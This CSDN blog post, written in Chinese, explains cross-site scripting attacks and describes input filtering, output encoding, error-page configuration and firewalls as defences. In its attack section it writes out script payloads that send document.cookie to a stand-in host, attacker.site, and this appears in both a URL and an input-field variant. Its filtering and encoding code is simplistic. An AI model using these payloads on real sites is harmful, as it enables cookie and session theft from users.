# 跨站脚本攻击（XSS）几种解决方案浅析 - 零度的博客专栏 - CSDN博客
2016年08月04日 17:38:29[零度anngle](https://me.csdn.net/zmx729618)阅读数：11176
#### 一、概述
       Cross-site scripting(CSS or XSS)跨站脚本不像其他攻击只包含两个部分：攻击者和web站点，跨站脚本包含三个部分：攻击者，客户和web站点。跨站脚本攻击的目的是窃取客户的cookies，或者其他可以证明用户身份的敏感信息。
#### 二、XSS攻击原理
一个get请求：
```
GET /welcome.cgi?name=Joe%20Hacker HTTP/1.0
 Host:www.vulnerable.site
```

会产生如下的结果：
```
<HTML>
< Title>Welcome!</Title>
 Hi Joe Hacker
< BR>
 Welcome to our system
 ...
< /HTML>
```
但是如果请求被篡改
```
GET /welcome.cgi?name=<script>alert(document.cookie)</script> HTTP/1.0
 Host:www.vulnerable.site
```

就会得到如下的响应
```
<HTML>
< Title>Welcome!</Title>
 Hi <script>alert(document.cookie)</script>
< BR>
 Welcome to our system
 ...
< /HTML>
```
这样在客户端会有一段非法的脚本执行，这不具有破坏作用，但是如下的脚本就很危险了。
```
http://www.vulnerable.site/welcome.cgi?name=<script>window.open(“http://www.attacker.site/collec
t.cgi?cookie=”%2Bdocument.cookie)</script>
```

响应如下：
```
<HTML>
< Title>Welcome!</Title>
 Hi
< script>window.open(“http://www.attacker.site/collect.cgi?cookie=”+document.cookie)<
 /script>
< BR>
 Welcome to our system
 ...
< /HTML>
```
      浏览器回执行该脚本并将客户的cookie发到一个攻击者的网站，这样攻击者就得到了客户的cookie。变体：除了使用<script>这个脚本之外，还可以使用其他的<img src=”javascript:...”>，这样对于过滤的站点有效。对于<input type=text name=user value=”...”>这样的输入，可以通过如下攻击<input type=text name=user value=”<script>window.open(“http://www.attacker.site/collect.cgi?cookie=”+document.cookie)</script>”
 />
#### 三、解决方法
1，输入过滤：
        对每一个用户的输入或者请求首部，都要进行过滤。这需要程序员有良好的安全素养，而且需要覆盖到所有的输入源。而且还不能够阻止其他的一些问题，如错误页等。
```
final String filterPattern="[<>{}\\[\\];\\&]";
 String inputStr = s.replaceAll(filterPattern," ");
```
 2，输出过滤：
```
public static String encode(String data){
   final StringBuffer buf = new StringBuffer();
   final char[] chars = data.toCharArray();
   for (int i = 0; i < chars.length; i++){
      buf.append("&#" + (int) chars[i]);
   }
   return buf.toString();
}
public static String decodeHex(final String data, final String charEncoding){
   if (data == null){
        return null; 
   }
   byte[] inBytes = null; 
   try{
      inBytes = data.getBytes(charEncoding);
   }catch (UnsupportedEncodingException e){
     //use default charset
     inBytes = data.getBytes();
   }
   byte[] outBytes = new byte[inBytes.length];
   int b1;
   int b2;
   int j=0;
   for (int i = 0; i < inBytes.length; i++){
      if (inBytes[i] == '%'){
         b1 = Character.digit((char) inBytes[++i], 16);
         b2 = Character.digit((char) inBytes[++i], 16);
         outBytes[j++] = (byte) (((b1 & 0xf) << 4) +(b2 & 0xf));
     }else{
         outBytes[j++] = inBytes[i];
     }
   }
   String encodedStr = null;
   try{
      encodedStr = new String(outBytes, 0, j, charEncoding);
   }catch (UnsupportedEncodingException e){
      encodedStr = new String(outBytes, 0, j);
   }
   return encodedStr;
}
< !-- Maps the 404 Not Found response code to the error page /errPage404 -->
<error-page>
    <error-code>404</error-code>
    <location>/errPage404</location>
</error-page>
<!-- Maps any thrown ServletExceptions to the error page /errPageServ -->
<error-page>
    <exception-type>javax.servlet.ServletException</exception-type>
    <location>/errPageServ</location>
</error-page>
<!-- Maps any other thrown exceptions to a generic error page /errPageGeneric -->
<error-page>
    <exception-type>java.lang.Throwable</exception-type>
    <location>/errPageGeneric</location>
</error-page>
任何的非servlet例外都被/errPageGeneric路径捕捉，这样就可以处理。
Throwable throwable = (Throwable)request.getAttribute("javax.servlet.error.exception");
String status_code = ((Integer)request.getAttribute("javax.servlet.error.status_code")).toString( );
```
3，安装三方的应用防火墙，可以拦截css攻击。
